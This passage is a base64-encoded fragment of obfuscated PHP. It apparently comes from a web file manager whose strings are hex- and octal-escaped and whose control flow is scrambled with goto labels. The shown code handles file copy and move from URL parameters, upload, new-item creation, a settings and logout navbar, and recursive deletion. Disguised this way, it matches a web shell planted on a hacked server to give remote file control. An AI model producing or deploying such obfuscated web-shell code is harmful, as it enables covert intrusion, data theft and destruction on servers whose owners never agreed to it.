pICYmICFGTV9SRUFET05MWSkgeyAkY29weSA9ICRfR0VUWyJceDYzXHg2Zlx4NzBceDc5Il07ICRjb3B5ID0gZm1fY2xlYW5fcGF0aCgkY29weSk7IGlmICgkY29weSA9PSAnJykgeyBmbV9zZXRfbXNnKGxuZygiXHg1M1wxNTdcMTY1XHg3Mlx4NjNceDY1XHgyMFwxNjBcMTQxXDE2NFwxNTBcNDBceDZlXDE1N1x4NzRceDIwXHg2NFwxNDVcMTQ2XHg2OVx4NmVcMTQ1XHg2NCIpLCAiXHg2NVx4NzJceDcyXHg2Zlx4NzIiKTsgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAiXDc3XDE2MFw3NSIgLiB1cmxlbmNvZGUoRk1fUEFUSCkpOyB9ICRmcm9tID0gRk1fUk9PVF9QQVRIIC4gIlx4MmYiIC4gJGNvcHk7ICRkZXN0ID0gRk1fUk9PVF9QQVRIOyBpZiAoRk1fUEFUSCAhPSAnJykgeyAkZGVzdCAuPSAiXHgyZiIgLiBGTV9QQVRIOyB9ICRkZXN0IC49ICJcNTciIC4gYmFzZW5hbWUoJGZyb20pOyAkbW92ZSA9IGlzc2V0KCRfR0VUWyJceDZkXHg2ZlwxNjZceDY1Il0pOyBpZiAoJGZyb20gIT0gJGRlc3QpIHsgJG1zZ19mcm9tID0gdHJpbShGTV9QQVRIIC4gIlx4MmYiIC4gYmFzZW5hbWUoJGZyb20pLCAiXHgyZiIpOyBpZiAoJG1vdmUpIHsgJHJlbmFtZSA9IGZtX3JlbmFtZSgkZnJvbSwgJGRlc3QpOyBpZiAoJHJlbmFtZSkgeyBmbV9zZXRfbXNnKHNwcmludGYobG5nKCJceDRkXDE1N1wxNjZceDY1XHg2NFx4MjBcMTQ2XHg3Mlx4NmZceDZkIikgLiAiXDQwXHgzY1wxNDJcNzZceDI1XDE2M1x4M2NcNTdceDYyXDc2XHgyMCIgLiBsbmcoIlx4NzRceDZmIikgLiAiXDQwXHgzY1x4NjJcNzZceDI1XHg3M1w3NFw1N1wxNDJceDNlIiwgZm1fZW5jKCRjb3B5KSwgZm1fZW5jKCRtc2dfZnJvbSkpKTsgfSBlbHNlaWYgKCRyZW5hbWUgPT09IG51bGwpIHsgZm1fc2V0X21zZyhsbmcoIlwxMDZcMTUxXDE1NFwxNDVcNDBceDZmXHg3Mlw0MFwxNDZcMTU3XHg2Y1wxNDRceDY1XHg3Mlw0MFwxNjdceDY5XHg3NFx4NjhcNDBcMTY0XHg2OFwxNTFcMTYzXHgyMFx4NzBceDYxXDE2NFwxNTBceDIwXHg2MVx4NmNceDcyXHg2NVx4NjFcMTQ0XDE3MVx4MjBceDY1XDE3MFx4NjlcMTYzXHg3NFx4NzMiKSwgIlx4NjFcMTU0XDE0NVx4NzJcMTY0Iik7IH0gZWxzZSB7IGZtX3NldF9tc2coc3ByaW50ZihsbmcoIlwxMDVceDcyXHg3MlwxNTdcMTYyXHgyMFwxNjdceDY4XHg2OVx4NmNcMTQ1XDQwXDE1NVx4NmZcMTY2XDE1MVx4NmVcMTQ3XHgyMFwxNDZcMTYyXDE1N1wxNTUiKSAuICJceDIwXDc0XHg2Mlx4M2VcNDVcMTYzXHgzY1w1N1wxNDJcNzZcNDAiIC4gbG5nKCJcMTY0XHg2ZiIpIC4gIlw0MFx4M2NcMTQyXHgzZVw0NVx4NzNcNzRcNTdceDYyXHgzZSIsIGZtX2VuYygkY29weSksIGZtX2VuYygkbXNnX2Zyb20pKSwgIlx4NjVcMTYyXDE2Mlx4NmZcMTYyIik7IH0gfSBlbHNlIHsgaWYgKGZtX3Jjb3B5KCRmcm9tLCAkZGVzdCkpIHsgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygiXDEwM1wxNTdceDcwXDE1MVx4NjVcMTQ0XHgyMFx4NjZcMTYyXDE1N1x4NmQiKSAuICJceDIwXHgzY1x4NjJcNzZceDI1XDE2M1w3NFw1N1x4NjJceDNlXDQwIiAuIGxuZygiXHg3NFwxNTciKSAuICJceDIwXDc0XHg2Mlw3Nlx4MjVceDczXDc0XHgyZlwxNDJcNzYiLCBmbV9lbmMoJGNvcHkpLCBmbV9lbmMoJG1zZ19mcm9tKSkpOyB9IGVsc2UgeyBmbV9zZXRfbXNnKHNwcmludGYobG5nKCJceDQ1XDE2MlwxNjJcMTU3XHg3Mlw0MFx4NzdceDY4XHg2OVwxNTRcMTQ1XDQwXDE0M1wxNTdceDcwXHg3OVwxNTFceDZlXDE0N1x4MjBcMTQ2XDE2Mlx4NmZceDZkIikgLiAiXHgyMFw3NFx4NjJcNzZceDI1XDE2M1w3NFx4MmZceDYyXDc2XHgyMCIgLiBsbmcoIlwxNjRcMTU3IikgLiAiXDQwXDc0XHg2Mlw3Nlx4MjVcMTYzXHgzY1x4MmZceDYyXDc2IiwgZm1fZW5jKCRjb3B5KSwgZm1fZW5jKCRtc2dfZnJvbSkpLCAiXHg2NVx4NzJcMTYyXDE1N1wxNjIiKTsgfSB9IH0gZWxzZSB7IGlmICghJG1vdmUpIHsgJG1zZ19mcm9tID0gdHJpbShGTV9QQVRIIC4gIlw1NyIgLiBiYXNlbmFtZSgkZnJvbSksICJceDJmIik7ICRmbl9wYXJ0cyA9IHBhdGhpbmZvKCRmcm9tKTsgJGV4dGVuc2lvbl9zdWZmaXggPSAnJzsgaWYgKCFpc19kaXIoJGZyb20pKSB7ICRleHRlbnNpb25fc3VmZml4ID0gIlx4MmUiIC4gJGZuX3BhcnRzWyJceDY1XHg3OFx4NzRcMTQ1XDE1Nlx4NzNcMTUxXHg2Zlx4NmUiXTsgfSAkZm5fZHVwbGljYXRlID0gJGZuX3BhcnRzWyJceDY0XHg2OVwxNjJceDZlXDE0MVwxNTVcMTQ1Il0gLiAiXHgyZiIgLiAkZm5fcGFydHNbIlwxNDZceDY5XDE1NFx4NjVcMTU2XHg2MVwxNTVcMTQ1Il0gLiAiXHgyZCIgLiBkYXRlKCJceDU5XHg2ZFwxNDRceDQ4XHg2OVwxNjMiKSAuICRleHRlbnNpb25fc3VmZml4OyAkbG9vcF9jb3VudCA9IDA7ICRtYXhfbG9vcCA9IDEwMDA7IHdoaWxlIChmaWxlX2V4aXN0cygkZm5fZHVwbGljYXRlKSAmICRsb29wX2NvdW50IDwgJG1heF9sb29wKSB7ICRmbl9wYXJ0cyA9IHBhdGhpbmZvKCRmbl9kdXBsaWNhdGUpOyAkZm5fZHVwbGljYXRlID0gJGZuX3BhcnRzWyJcMTQ0XDE1MVwxNjJcMTU2XDE0MVwxNTVceDY1Il0gLiAiXHgyZiIgLiAkZm5fcGFydHNbIlx4NjZcMTUxXHg2Y1wxNDVcMTU2XHg2MVwxNTVcMTQ1Il0gLiAiXDU1XDE0M1x4NmZcMTYwXDE3MSIgLiAkZXh0ZW5zaW9uX3N1ZmZpeDsgJGxvb3BfY291bnQrKzsgfSBpZiAoZm1fcmNvcHkoJGZyb20sICRmbl9kdXBsaWNhdGUsIEZhbHNlKSkgeyBmbV9zZXRfbXNnKHNwcmludGYoIlwxMDNcMTU3XHg3MFx4NzlcMTUxXHg2NVx4NjRceDIwXDE0NlwxNjJcMTU3XHg2ZFx4MjBcNzRceDYyXDc2XHgyNVwxNjNcNzRcNTdcMTQyXHgzZVx4MjBceDc0XHg2Zlx4MjBceDNjXDE0Mlx4M2VceDI1XHg3M1w3NFx4MmZceDYyXDc2IiwgZm1fZW5jKCRjb3B5KSwgZm1fZW5jKCRmbl9kdXBsaWNhdGUpKSk7IH0gZWxzZSB7IGZtX3NldF9tc2coc3ByaW50ZigiXDEwNVwxNjJcMTYyXDE1N1wxNjJceDIwXDE2N1wxNTBcMTUxXDE1NFwxNDVceDIwXHg2M1x4NmZcMTYwXHg3OVwxNTFcMTU2XDE0N1w0MFx4NjZceDcyXHg2Zlx4NmRceDIwXDc0XDE0Mlx4M2VceDI1XDE2M1w3NFx4MmZceDYyXHgzZVx4MjBceDc0XHg2Zlw0MFw3NFx4NjJcNzZceDI1XDE2M1x4M2NcNTdceDYyXHgzZSIsIGZtX2VuYygkY29weSksIGZtX2VuYygkZm5fZHVwbGljYXRlKSksICJceDY1XDE2Mlx4NzJceDZmXDE2MiIpOyB9IH0gZWxzZSB7IGZtX3NldF9tc2cobG5nKCJceDUwXDE0MVx4NzRcMTUwXDE2M1w0MFx4NmRceDc1XDE2M1x4NzRcNDBceDYyXDE0NVw0MFwxNTZceDZmXDE2NFx4MjBcMTQ1XDE2MVx4NzVcMTQxXHg2YyIpLCAiXDE0MVwxNTRceDY1XDE2Mlx4NzQiKTsgfSB9IGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gIlw3N1wxNjBcNzUiIC4gdXJsZW5jb2RlKEZNX1BBVEgpKTsgfSBnb3RvIGtUc0JZOyB1c1RZdDogPz4KICAgICAgICA8L3RhYmxlPgogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICA8P3BocCAgZ290byBIYjBoNzsgemR2aGE6ID8+CjwvdGg+CiAgICAgICAgICAgICAgICA8dGg+PD9waHAgIGdvdG8gWHhjOHM7IFpGWlllOiAkaXNfaHR0cHMgPSBpc3NldCgkX1NFUlZFUlsiXDExMFx4NTRceDU0XDEyMFwxMjMiXSkgJiYgKCRfU0VSVkVSWyJcMTEwXHg1NFx4NTRceDUwXDEyMyJdID09ICJceDZmXHg2ZSIgfHwgJF9TRVJWRVJbIlwxMTBcMTI0XHg1NFwxMjBceDUzIl0gPT0gMSkgfHwgaXNzZXQoJF9TRVJWRVJbIlx4NDhcMTI0XHg1NFx4NTBceDVmXHg1OFx4NWZcMTA2XDExN1wxMjJcMTI3XDEwMVwxMjJceDQ0XDEwNVx4NDRcMTM3XDEyMFx4NTJcMTE3XHg1NFx4NGYiXSkgJiYgJF9TRVJWRVJbIlx4NDhcMTI0XHg1NFx4NTBcMTM3XHg1OFx4NWZceDQ2XDExN1x4NTJcMTI3XHg0MVwxMjJceDQ0XHg0NVx4NDRcMTM3XHg1MFwxMjJcMTE3XHg1NFx4NGYiXSA9PSAiXDE1MFx4NzRceDc0XDE2MFx4NzMiOyBnb3RvIHMyTW5SOyB6SkVYQTogJG9iamVjdHMgPSBpc19yZWFkYWJsZSgkcGF0aCkgPyBzY2FuZGlyKCRwYXRoKSA6IGFycmF5KCk7IGdvdG8gek9Vb1I7IFBJdlN3OiBlY2hvIGxuZygiXHg0MVwxNDNcMTY0XHg2OVx4NmZceDZlXHg3MyIpOyBnb3RvIEJ2SndBOyBGM05pRjogJGRlZmF1bHRfdGltZXpvbmUgPSAiXDEwNVx4NzRceDYzXDU3XDEyNVwxMjRceDQzIjsgZ290byBtWWtjWDsgQW9JOUk6IGZ1bmN0aW9uIGZtX3Nob3dfbmF2X3BhdGgoJHBhdGgpIHsgZ2xvYmFsICRsYW5nLCAkc3RpY2t5X25hdmJhcjsgJGlzU3RpY2t5TmF2QmFyID0gJHN0aWNreV9uYXZiYXIgPyAiXHg2Nlx4NjlceDc4XDE0NVx4NjRceDJkXHg3NFx4NmZceDcwIiA6ICcnOyAkZ2V0VGhlbWUgPSBmbV9nZXRfdGhlbWUoKTsgJGdldFRoZW1lIC49ICJcNDBceDZlXHg2MVx4NzZceDYyXHg2MVwxNjJceDJkXHg2Y1wxNTFcMTQ3XDE1MFwxNjQiOyBpZiAoRk1fVEhFTUUgPT0gIlx4NjRcMTQxXDE2Mlx4NmIiKSB7ICRnZXRUaGVtZSAuPSAiXHgyMFx4NmVcMTQxXDE2NlwxNDJceDYxXHg3Mlx4MmRceDY0XDE0MVx4NzJceDZiIjsgfSBlbHNlIHsgJGdldFRoZW1lIC49ICJcNDBceDYyXHg2N1x4MmRceDc3XHg2OFx4NjlceDc0XDE0NSI7IH0gPz4KICAgIDxuYXYgY2xhc3M9Im5hdmJhciBuYXZiYXItZXhwYW5kLWxnIDw/cGhwICBlY2hvICRnZXRUaGVtZTsgPz4KIG1iLTQgbWFpbi1uYXYgPD9waHAgIGVjaG8gJGlzU3RpY2t5TmF2QmFyOyA/PgoiPgogICAgICAgIDxhIGNsYXNzPSJuYXZiYXItYnJhbmQiIGhyZWY9IiI+IDw/cGhwICBlY2hvIGxuZygiXDEwMVx4NzBceDcwXDEyNFx4NjlcMTY0XDE1NFwxNDUiKTsgPz4KIDwvYT4KICAgICAgICA8YnV0dG9uIGNsYXNzPSJuYXZiYXItdG9nZ2xlciIgdHlwZT0iYnV0dG9uIiBkYXRhLXRvZ2dsZT0iY29sbGFwc2UiIGRhdGEtdGFyZ2V0PSIjbmF2YmFyU3VwcG9ydGVkQ29udGVudCIgYXJpYS1jb250cm9scz0ibmF2YmFyU3VwcG9ydGVkQ29udGVudCIgYXJpYS1leHBhbmRlZD0iZmFsc2UiIGFyaWEtbGFiZWw9IlRvZ2dsZSBuYXZpZ2F0aW9uIj4KICAgICAgICAgICAgPHNwYW4gY2xhc3M9Im5hdmJhci10b2dnbGVyLWljb24iPjwvc3Bhbj4KICAgICAgICA8L2J1dHRvbj4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2xsYXBzZSBuYXZiYXItY29sbGFwc2UiIGlkPSJuYXZiYXJTdXBwb3J0ZWRDb250ZW50Ij4KCiAgICAgICAgICAgIDw/cGhwICAkcGF0aCA9IGZtX2NsZWFuX3BhdGgoJHBhdGgpOyAkcm9vdF91cmwgPSAiXHgzY1wxNDFceDIwXDE1MFx4NzJceDY1XDE0Nlx4M2RceDI3XHgzZlwxNjBcNzVceDI3XDc2XDc0XHg2OVx4MjBcMTQzXDE1NFwxNDFceDczXDE2M1x4M2RcNDdceDY2XHg2MVx4MjBceDY2XDE0MVw1NVx4NjhcMTU3XHg2ZFx4NjVceDI3XDQwXHg2MVwxNjJcMTUxXHg2MVw1NVx4NjhcMTUxXHg2NFwxNDRcMTQ1XDE1Nlx4M2RcNDdceDc0XHg3MlwxNjVceDY1XHgyN1x4MjBceDc0XDE1MVx4NzRceDZjXDE0NVw3NVx4MjciIC4gRk1fUk9PVF9QQVRIIC4gIlx4MjdcNzZcNzRceDJmXHg2OVx4M2VcNzRceDJmXHg2MVw3NiI7ICRzZXAgPSAiXHgzY1x4NjlcNDBcMTQzXHg2Y1x4NjFcMTYzXHg3M1w3NVx4MjJcMTQyXDE2Mlx4NjVcMTQxXDE0NFw1NVx4NjNcMTYyXDE2NVwxNTVcMTQyXDQyXDc2XHgyMFx4MmZcNDBcNzRceDJmXDE1MVw3NiI7IGlmICgkcGF0aCAhPSAnJykgeyAkZXhwbG9kZWQgPSBleHBsb2RlKCJcNTciLCAkcGF0aCk7ICRjb3VudCA9IGNvdW50KCRleHBsb2RlZCk7ICRhcnJheSA9IGFycmF5KCk7ICRwYXJlbnQgPSAnJzsgZm9yICgkaSA9IDA7ICRpIDwgJGNvdW50OyAkaSsrKSB7ICRwYXJlbnQgPSB0cmltKCRwYXJlbnQgLiAiXHgyZiIgLiAkZXhwbG9kZWRbJGldLCAiXDU3Iik7ICRwYXJlbnRfZW5jID0gdXJsZW5jb2RlKCRwYXJlbnQpOyAkYXJyYXlbXSA9ICJceDNjXDE0MVw0MFx4NjhcMTYyXDE0NVwxNDZcNzVcNDdceDNmXDE2MFw3NXskcGFyZW50X2VuY31ceDI3XDc2IiAuIGZtX2VuYyhmbV9jb252ZXJ0X3dpbigkZXhwbG9kZWRbJGldKSkgLiAiXDc0XHgyZlwxNDFcNzYiOyB9ICRyb290X3VybCAuPSAkc2VwIC4gaW1wbG9kZSgkc2VwLCAkYXJyYXkpOyB9IGVjaG8gIlw3NFx4NjRcMTUxXHg3Nlw0MFx4NjNceDZjXHg2MVwxNjNceDczXHgzZFx4MjJcMTQzXHg2ZlwxNTRceDJkXDE3MFx4NzNceDJkXHgzNlx4MjBceDYzXDE1N1x4NmNceDJkXDE2M1wxNTVceDJkXHgzNVx4MjJceDNlIiAuICRyb290X3VybCAuICJceDNjXHgyZlwxNDRcMTUxXDE2Nlw3NiI7ID8+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtNiBjb2wtc20tNyB0ZXh0LXJpZ2h0Ij4KICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibmF2YmFyLW5hdiBtci1hdXRvIGZsb2F0LXJpZ2h0IDw/cGhwICBlY2hvIGZtX2dldF90aGVtZSgpOyA/PgoiPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0gbXItMiI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LWdyb3VwIGlucHV0LWdyb3VwLXNtIG1yLTEiIHN0eWxlPSJtYXJnaW4tdG9wOjRweDsiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wiIHBsYWNlaG9sZGVyPSI8P3BocCAgZWNobyBsbmcoIlwxMjNcMTQ1XDE0MVx4NzJcMTQzXDE1MCIpOyA/PgoiIGFyaWEtbGFiZWw9Ijw/cGhwICBlY2hvIGxuZygiXHg1M1x4NjVcMTQxXDE2Mlx4NjNcMTUwIik7ID8+CiIgYXJpYS1kZXNjcmliZWRieT0ic2VhcmNoLWFkZG9uMiIgaWQ9InNlYXJjaC1hZGRvbiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cC1hcHBlbmQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJpbnB1dC1ncm91cC10ZXh0IiBpZD0ic2VhcmNoLWFkZG9uMiI+PGkgY2xhc3M9ImZhIGZhLXNlYXJjaCI+PC9pPjwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAtYXBwZW5kIGJ0bi1ncm91cCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImlucHV0LWdyb3VwLXRleHQgZHJvcGRvd24tdG9nZ2xlIiBpZD0ic2VhcmNoLWFkZG9uMiIgZGF0YS10b2dnbGU9ImRyb3Bkb3duIiBhcmlhLWhhc3BvcHVwPSJ0cnVlIiBhcmlhLWV4cGFuZGVkPSJmYWxzZSI+PC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZHJvcGRvd24tbWVudSBkcm9wZG93bi1tZW51LXJpZ2h0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImRyb3Bkb3duLWl0ZW0iIGhyZWY9Ijw/cGhwICBlY2hvICRwYXRoMiA9ICRwYXRoID8gJHBhdGggOiAiXDU2IjsgPz4KIiBpZD0ianMtc2VhcmNoLW1vZGFsIiBkYXRhLXRvZ2dsZT0ibW9kYWwiIGRhdGEtdGFyZ2V0PSIjc2VhcmNoTW9kYWwiPjw/cGhwICBlY2hvIGxuZygiXDEwMVx4NjRcMTY2XDE0MVx4NmVceDYzXDE0NVx4NjRcNDBceDUzXHg2NVwxNDFcMTYyXHg2M1wxNTAiKTsgPz4KPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9saT4KICAgICAgICAgICAgICAgICAgICA8P3BocCAgaWYgKCFGTV9SRUFET05MWSkgeyA/PgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgIGVjaG8gbG5nKCJceDU1XHg3MFx4NmNcMTU3XDE0MVx4NjQiKTsgPz4KIiBjbGFzcz0ibmF2LWxpbmsiIGhyZWY9Ij9wPTw/cGhwICBlY2hvIHVybGVuY29kZShGTV9QQVRIKTsgPz4KJmFtcDt1cGxvYWQiPjxpIGNsYXNzPSJmYSBmYS1jbG91ZC11cGxvYWQiIGFyaWEtaGlkZGVuPSJ0cnVlIj48L2k+IDw/cGhwICBlY2hvIGxuZygiXHg1NVx4NzBcMTU0XDE1N1x4NjFceDY0Iik7ID8+CjwvYT4KICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0ibmF2LWl0ZW0iPgogICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgIGVjaG8gbG5nKCJcMTE2XHg2NVx4NzdceDQ5XDE2NFwxNDVcMTU1Iik7ID8+CiIgY2xhc3M9Im5hdi1saW5rIiBocmVmPSIjY3JlYXRlTmV3SXRlbSIgZGF0YS10b2dnbGU9Im1vZGFsIiBkYXRhLXRhcmdldD0iI2NyZWF0ZU5ld0l0ZW0iPjxpIGNsYXNzPSJmYSBmYS1wbHVzLXNxdWFyZSI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlwxMTZceDY1XHg3N1wxMTFceDc0XDE0NVwxNTUiKTsgPz4KPC9hPgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgIH0gPz4KICAgICAgICAgICAgICAgICAgICA8P3BocCAgaWYgKEZNX1VTRV9BVVRIKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJuYXYtaXRlbSBhdmF0YXIgZHJvcGRvd24iPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibmF2LWxpbmsgZHJvcGRvd24tdG9nZ2xlIiBpZD0ibmF2YmFyRHJvcGRvd25NZW51TGluay01IiBkYXRhLXRvZ2dsZT0iZHJvcGRvd24iIGFyaWEtaGFzcG9wdXA9InRydWUiIGFyaWEtZXhwYW5kZWQ9ImZhbHNlIj4gPGkgY2xhc3M9ImZhIGZhLXVzZXItY2lyY2xlIj48L2k+IDw/cGhwICBpZiAoaXNzZXQoJF9TRVNTSU9OW0ZNX1NFU1NJT05fSURdWyJcMTU0XHg2ZlwxNDdceDY3XHg2NVwxNDQiXSkpIHsgZWNobyAkX1NFU1NJT05bRk1fU0VTU0lPTl9JRF1bIlx4NmNceDZmXDE0N1wxNDdcMTQ1XHg2NCJdOyB9ID8+CjwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZHJvcGRvd24tbWVudSBkcm9wZG93bi1tZW51LXJpZ2h0IDw/cGhwICBlY2hvIGZtX2dldF90aGVtZSgpOyA/PgoiIGFyaWEtbGFiZWxsZWRieT0ibmF2YmFyRHJvcGRvd25NZW51TGluay01Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwICBpZiAoIUZNX1JFQURPTkxZKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgIGVjaG8gbG5nKCJcMTIzXHg2NVx4NzRceDc0XHg2OVwxNTZcMTQ3XDE2MyIpOyA/PgoiIGNsYXNzPSJkcm9wZG93bi1pdGVtIG5hdi1saW5rIiBocmVmPSI/cD08P3BocCAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCk7ID8+CiZhbXA7c2V0dGluZ3M9MSI+PGkgY2xhc3M9ImZhIGZhLWNvZyIgYXJpYS1oaWRkZW49InRydWUiPjwvaT4gPD9waHAgIGVjaG8gbG5nKCJceDUzXDE0NVwxNjRceDc0XDE1MVx4NmVcMTQ3XHg3MyIpOyA/Pgo8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAgfSA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwICBlY2hvIGxuZygiXHg0OFwxNDVceDZjXDE2MCIpOyA/PgoiIGNsYXNzPSJkcm9wZG93bi1pdGVtIG5hdi1saW5rIiBocmVmPSI/cD08P3BocCAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCk7ID8+CiZhbXA7aGVscD0yIj48aSBjbGFzcz0iZmEgZmEtZXhjbGFtYXRpb24tY2lyY2xlIiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlx4NDhcMTQ1XHg2Y1x4NzAiKTsgPz4KPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwICBlY2hvIGxuZygiXDExNFwxNTdceDY3XHg2ZlwxNjVceDc0Iik7ID8+CiIgY2xhc3M9ImRyb3Bkb3duLWl0ZW0gbmF2LWxpbmsiIGhyZWY9Ij9sb2dvdXQ9MSI+PGkgY2xhc3M9ImZhIGZhLXNpZ24tb3V0IiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiA8P3BocCAgZWNobyBsbmcoIlwxMTRcMTU3XHg2N1x4NmZcMTY1XDE2NCIpOyA/Pgo8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvbGk+CiAgICAgICAgICAgICAgICAgICAgPD9waHAgIH0gZWxzZSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwICBpZiAoIUZNX1JFQURPTkxZKSB7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Im5hdi1pdGVtIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgIGVjaG8gbG5nKCJcMTIzXHg2NVx4NzRcMTY0XHg2OVwxNTZceDY3XHg3MyIpOyA/PgoiIGNsYXNzPSJkcm9wZG93bi1pdGVtIG5hdi1saW5rIiBocmVmPSI/cD08P3BocCAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCk7ID8+CiZhbXA7c2V0dGluZ3M9MSI+PGkgY2xhc3M9ImZhIGZhLWNvZyIgYXJpYS1oaWRkZW49InRydWUiPjwvaT4gPD9waHAgIGVjaG8gbG5nKCJcMTIzXHg2NVx4NzRceDc0XHg2OVx4NmVceDY3XDE2MyIpOyA/Pgo8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2xpPgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAgfSA/PgogICAgICAgICAgICAgICAgICAgIDw/cGhwICB9ID8+CiAgICAgICAgICAgICAgICA8L3VsPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvbmF2PgogICAgPD9waHAgIH0gZ290byBXUWl0WDsgQjJMMV86IGRlZmluZWQoIlwxMDZcMTE1XHg1ZlwxMjVcMTIzXDEwNVx4NWZcMTEwXDExMVwxMDdceDQ4XDExNFx4NDlcMTA3XDExMFx4NTRceDRhXHg1MyIpIHx8IGRlZmluZSgiXDEwNlwxMTVceDVmXHg1NVx4NTNceDQ1XDEzN1wxMTBceDQ5XHg0N1x4NDhceDRjXHg0OVx4NDdceDQ4XHg1NFx4NGFcMTIzIiwgJHVzZV9oaWdobGlnaHRqcyk7IGdvdG8gQTNUNHc7IHdhNFFVOiBmdW5jdGlvbiBmbV9nZXRfYXVkaW9fZXh0cygpIHsgcmV0dXJuIGFycmF5KCJcMTY3XHg2MVwxNjYiLCAiXDE1NVwxNjBcNjMiLCAiXDE1N1wxNDdcMTQ3IiwgIlx4NmRcNjRceDYxIik7IH0gZ290byBRYzBsVTsgSnlLQzY6ICRwID0gaXNzZXQoJF9HRVRbIlwxNjAiXSkgPyAkX0dFVFsiXDE2MCJdIDogKGlzc2V0KCRfUE9TVFsiXDE2MCJdKSA/ICRfUE9TVFsiXHg3MCJdIDogJycpOyBnb3RvIG1hNXlUOyB1ZTZUaDogZGVmaW5lZCgiXHg0Nlx4NGRceDVmXDEwNVx4NThceDQzXDExNFwxMjVcMTA0XHg0NVwxMzdceDQ5XHg1NFwxMDVceDRkXHg1MyIpIHx8IGRlZmluZSgiXHg0Nlx4NGRcMTM3XDEwNVwxMzBcMTAzXHg0Y1wxMjVcMTA0XDEwNVx4NWZceDQ5XDEyNFx4NDVcMTE1XHg1MyIsIHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgIlx4MzdcNTZceDMwXHgyZVw2MCIsICJcNzQiKSA/IHNlcmlhbGl6ZSgkZXhjbHVkZV9pdGVtcykgOiAkZXhjbHVkZV9pdGVtcyk7IGdvdG8ga2dqQVY7IG95bDhJOiBkZWZpbmVkKCJcMTA2XHg0ZFx4NWZceDUzXDEwNVx4NGNcMTA2XDEzN1x4NTVcMTIyXHg0YyIpIHx8IGRlZmluZSgiXDEwNlx4NGRceDVmXDEyM1wxMDVceDRjXDEwNlwxMzdcMTI1XHg1MlwxMTQiLCAoJGlzX2h0dHBzID8gIlx4NjhceDc0XHg3NFwxNjBcMTYzIiA6ICJceDY4XDE2NFwxNjRceDcwIikgLiAiXDcyXHgyZlx4MmYiIC4gJGh0dHBfaG9zdCAuICRfU0VSVkVSWyJceDUwXDExMFx4NTBceDVmXHg1M1wxMDVcMTE0XHg0NiJdKTsgZ290byBFaFFfcjsgSGxRRXY6IGZ1bmN0aW9uIGZtX3JkZWxldGUoJHBhdGgpIHsgaWYgKGlzX2xpbmsoJHBhdGgpKSB7IHJldHVybiB1bmxpbmsoJHBhdGgpOyB9IGVsc2VpZiAoaXNfZGlyKCRwYXRoKSkgeyAkb2JqZWN0cyA9IHNjYW5kaXIoJHBhdGgpOyAkb2sgPSB0cnVlOyBpZiAoaXNfYXJyYXkoJG9iamVjdHMpKSB7IGZvcmVhY2ggKCRvYmplY3RzIGFzICR